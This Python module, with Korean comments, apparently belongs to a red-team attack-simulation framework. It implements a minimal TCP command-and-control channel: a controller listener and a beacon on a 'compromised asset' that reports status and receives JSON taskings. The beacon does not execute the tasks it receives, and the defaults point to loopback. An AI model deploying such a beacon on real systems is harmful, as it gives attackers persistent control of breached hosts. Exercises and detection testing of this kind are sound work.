"""C2 채널 — 실제 TCP 비콘(controller ↔ beacon). 킬체인 6단계 실전송.

controller(C2Listener)가 상용포트에서 대기하고, 침해자산의 beacon(C2Beacon)이
접속해 상태를 보고하고 태스킹을 수신한다. 순수 stdlib 소켓 — loopback 실검증.
실 운용에선 C2_HOST/C2_PORT env 로 표적 지정(시험창 한정).

ATT&CK: Command And Control(TA0011), T0885 Commonly Used Port.
"""
from __future__ import annotations

import json
import socket
import threading
from dataclasses import dataclass
from typing import Optional


@dataclass
class Tasking:
    command: str
    args: dict


def _send_json(sock, obj):
    sock.sendall(json.dumps(obj).encode() + b"\n")


def _recv_json(sock):
    buf = b""
    while not buf.endswith(b"\n"):
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return json.loads(buf.decode() or "{}")


class C2Listener:
    """controller 측 — 비콘 1건을 받아 태스킹으로 응답(테스트/데모용)."""

    def __init__(self, host="127.0.0.1", port=0, tasking=None):
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((host, port))
        self._srv.listen(1)
        self.host, self.port = self._srv.getsockname()
        self.tasking = tasking or Tasking("noop", {})
        self.received = None
        self._thread = None

    def serve_once(self):
        """접속 1건을 받아 보고 수신 → 태스킹 응답. 백그라운드 스레드로."""
        def _run():
            conn, _ = self._srv.accept()
            with conn:
                self.received = _recv_json(conn)
                _send_json(conn, {"command": self.tasking.command, "args": self.tasking.args})
        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()

    def close(self):
        if self._thread:
            self._thread.join(timeout=2.0)
        self._srv.close()


class C2Beacon:
    """침해자산 측 — controller 에 접속해 상태 보고 후 태스킹 수신."""

    def __init__(self, host, port, agent_id="beacon-1"):
        self.host, self.port, self.agent_id = host, port, agent_id

    def beacon(self, status="alive", timeout=3.0):
        with socket.create_connection((self.host, self.port), timeout=timeout) as s:
            _send_json(s, {"agent": self.agent_id, "status": status})
            resp = _recv_json(s)
        return Tasking(resp.get("command", "noop"), resp.get("args", {}))
